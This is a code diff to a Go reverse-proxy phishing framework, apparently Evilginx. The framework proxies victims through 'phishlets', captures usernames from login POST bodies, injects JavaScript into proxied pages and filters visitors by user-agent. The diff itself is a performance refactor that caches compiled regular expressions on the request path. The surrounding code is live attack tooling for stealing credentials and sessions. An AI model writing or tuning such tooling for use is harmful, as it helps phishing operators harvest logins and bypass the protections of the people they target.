@@ -61,6 +61,18 @@ const (
 var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 
+// Constant patterns used on the request/response hot path, compiled once at
+// init instead of on every request/response.
+var (
+	sessionRedirectRe = regexp.MustCompile("^\\/s\\/([^\\/]*)")
+	jsInjectPathRe    = regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
+	jsonContentTypeRe = regexp.MustCompile("application\\/\\w*\\+?json")
+	formContentTypeRe = regexp.MustCompile("application\\/x-www-form-urlencoded")
+	scriptNonceRe     = regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
+	bodyCloseTagRe    = regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
+	headTagRe         = regexp.MustCompile(`(?i)(<\s*head\s*>)`)
+)
+
 type HttpProxy struct {
 	Server            *http.Server
 	Proxy             *goproxy.ProxyHttpServer
@@ -81,6 +93,7 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	reCache           sync.Map // map[string]*regexp.Regexp: memoized dynamic patterns
 }
 
 type ProxySession struct {
@@ -213,11 +226,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
 
-			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
-			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
-
-			if js_inject_re.MatchString(req.URL.Path) {
-				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
+			if jsInjectPathRe.MatchString(req.URL.Path) {
+				ra := jsInjectPathRe.FindStringSubmatch(req.URL.Path)
 				if len(ra) >= 3 {
 					session_id := ra[1]
 					js_id := ra[2]
@@ -241,8 +251,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
-			} else if redir_re.MatchString(req.URL.Path) {
-				ra := redir_re.FindStringSubmatch(req.URL.Path)
+			} else if sessionRedirectRe.MatchString(req.URL.Path) {
+				ra := sessionRedirectRe.FindStringSubmatch(req.URL.Path)
 				if len(ra) >= 2 {
 					session_id := ra[1]
 					if strings.HasSuffix(session_id, ".js") {
@@ -347,7 +357,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								// check if lure user-agent filter is triggered
 								if len(l.UserAgentFilter) > 0 {
-									re, err := regexp.Compile(l.UserAgentFilter)
+									re, err := p.compileRegex(l.UserAgentFilter)
 									if err == nil {
 										if !re.MatchString(req.UserAgent()) {
 											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
@@ -683,10 +693,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						contentType := req.Header.Get("Content-type")
 
-						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
-						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")
-
-						if json_re.MatchString(contentType) {
+						if jsonContentTypeRe.MatchString(contentType) {
 
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
@@ -762,7 +769,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
-						} else if form_re.MatchString(contentType) {
+						} else if formContentTypeRe.MatchString(contentType) {
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
@@ -1143,7 +1150,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
 									}
 
-									if re, err := regexp.Compile(re_s); err == nil {
+									if re, err := p.compileRegex(re_s); err == nil {
 										body = []byte(re.ReplaceAllString(string(body), replace_s))
 									} else {
 										log.Error("regexp failed to compile: `%s`", sf.regexp)
@@ -1337,13 +1344,12 @@ func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Re
 }
 
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
-	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
-	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
+	m_nonce := scriptNonceRe.FindStringSubmatch(string(body))
 	js_nonce := ""
 	if m_nonce != nil {
 		js_nonce = " nonce=\"" + m_nonce[1] + "\""
 	}
-	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
+	re := bodyCloseTagRe
 	var d_inject string
 	if script != "" {
 		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
@@ -1550,6 +1556,24 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			}, nil
 		}
 	}
+}
+
+// compileRegex compiles a regular expression, memoizing the result keyed by the
+// (already fully-substituted) pattern string. Sub_filter and lure user-agent
+// patterns are rebuilt identically on every request/response, so this turns
+// repeated compilation into a single compile per distinct pattern. Any config
+// change yields a new pattern string and therefore a fresh compile, so the cache
+// never goes stale.
+func (p *HttpProxy) compileRegex(pattern string) (*regexp.Regexp, error) {
+	if v, ok := p.reCache.Load(pattern); ok {
+		return v.(*regexp.Regexp), nil
+	}
+	re, err := regexp.Compile(pattern)
+	if err != nil {
+		return nil, err
+	}
+	actual, _ := p.reCache.LoadOrStore(pattern, re)
+	return actual.(*regexp.Regexp), nil
 }
 
 func (p *HttpProxy) setSessionUsername(sid string, username string) {
@@ -1823,7 +1847,7 @@ func (p *HttpProxy) handleSession(hostname string) bool {
 
 func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
-		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
+		head_re := headTagRe
 		var og_inject string
 		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
 		if l.OgTitle != "" {
